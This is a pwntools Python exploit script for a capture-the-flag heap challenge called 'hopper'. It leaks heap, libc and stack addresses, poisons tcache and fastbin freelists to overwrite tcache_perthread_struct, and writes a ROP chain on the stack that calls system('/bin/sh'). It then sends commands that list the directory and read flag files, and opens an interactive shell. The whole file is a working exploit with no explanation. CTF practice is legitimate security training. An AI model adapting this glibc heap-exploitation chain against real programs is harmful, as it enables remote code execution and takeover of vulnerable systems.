from pwn import *
#context.log_level = 'debug'
context.arch = 'amd64'
context.terminal = ['tmux', 'split-window', '-h']

TARGET = './vuln'
HOST = 'hopper.chal.imaginaryctf.org'
PORT =  1337

elf = ELF(TARGET)
def start():
    if not args.R:
        print("local")
        return process(TARGET)
    else:
        print("remote")
        return remote(HOST, PORT)

def get_base_address(proc):
    lines = open("/proc/{}/maps".format(proc.pid), 'r').readlines()
    for line in lines :
        if TARGET[2:] in line.split('/')[-1] :
            break
    return int(line.split('-')[0], 16)

def debug(proc, breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(proc)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    script += "c"
    gdb.attach(proc, gdbscript=script)

def dbg(val): print("\t-> %s: 0x%x" % (val, eval(val)))


def al(d, s=''):
    r.sendlineafter(b'choice> ', b'1')
    if s == '':
        r.sendlineafter(b'size> ', str(len(d)+1).encode())
    else:
        r.sendlineafter(b'size> ', str(s).encode())
        if s <= 1: 
            return

    r.sendlineafter(b'content> ', d)

def dl(idx):
    r.sendlineafter(b'choice> ', b'2')
    r.sendlineafter(b'idx> ', str(idx).encode())
def show(idx):
    r.sendlineafter(b'choice> ', b'3')
    r.sendlineafter(b'idx> ', str(idx).encode())

r = start()

# leak heap, libc
al(b'a'* 0x40)
dl(0)
al(b'a', 0x418)
al(b'a', 0x18)
dl(0)

al(b'', 0)
al(b'', 0)
al(b'', 0)

show(1)
r.recvuntil(b'data: ')
heap_leak = u64(r.recvuntil(b'1. alloc', True).ljust(8, b'\x00'))
heap = heap_leak << 12
heap -= 0x11000
show(3)
r.recvuntil(b'data: ')
libc_leak = u64(r.recvuntil(b'1. alloc', True).ljust(8, b'\x00'))
base = libc_leak - 0x21ace0
if args.R:
    base += 0x1000
dbg('heap')
dbg('base')

system = base + 0x50d70
binsh = base + 0x1d8678
environ = base + 0x222200
rdi = base + 0x001bbea1

if args.R:
    system = base + 0x50d60
    binsh = base + 0x1d8698
    environ = base + 0x0000000000221200
    rdi =  base+ 0x001bc021

al(b'a'*0xe0+p64((heap+0x12060)>>12)) # fake fastbin chunk to chain
al(b'a'*0xe0+p64(0xbeef0))
dl(4)
dl(4)

# stash 7chunks to tcache
for i in range(7):
    al(b'a'*0x60)
for i in range(6*30):
    al('', -1)

al(b'b'*0x60)
for i in range(7):
    dl(4)

# realloc 1chunk, then re-free 
dl(5)
al(b'b'*0x60)
dl(4)

# place fake fd
al(p64((heap+0x12050)^((heap+0x134d0)>>12)), 0x60)
for i in range(6):
    al(chr(0x30+i).encode()*4, 0x60)

al(flat(0xdead, 0xbeef), 0x60)

# use overlapped chunk to edit fd of 0x100 sized chunk
payload = b''
payload += flat(0x11dead, 0x22beef)
payload += flat(0x33c0de, 0x101)
payload += flat((heap+0x80)^((heap+0x12080) >> 12))

al(payload, 0x60)

# overwrite tcache_perthread_struct
al(b'a'*0xf0)
payload = b''
payload += b'a'*0x10
payload += flat(environ, heap+0x90) # addresses we will allocate
al(payload, 0xf0)

# leak stack address
al('', 0)
show(16)
r.recvuntil(b'data: ')
stack = u64(r.recvuntil(b'1. alloc', True).ljust(8, b'\x00'))
dbg('stack')
if args.D:
    debug(r, [0x16a6])

context.log_level = 'debug'
target = stack-0x190

# overwrite tcache_perthread_struct again
payload = b''
payload += flat(0, 0, 0xbeef, target-8)

al(payload, 0x24)


# send ROP payload to stack
payload = b''
payload += flat(0xdead, rdi+1, rdi, binsh, system, 0xbeef)
al(payload, 0x40)

r.sendline(b'cat f*; ls -la; pwd ;cat /f*')

r.interactive()
r.close()

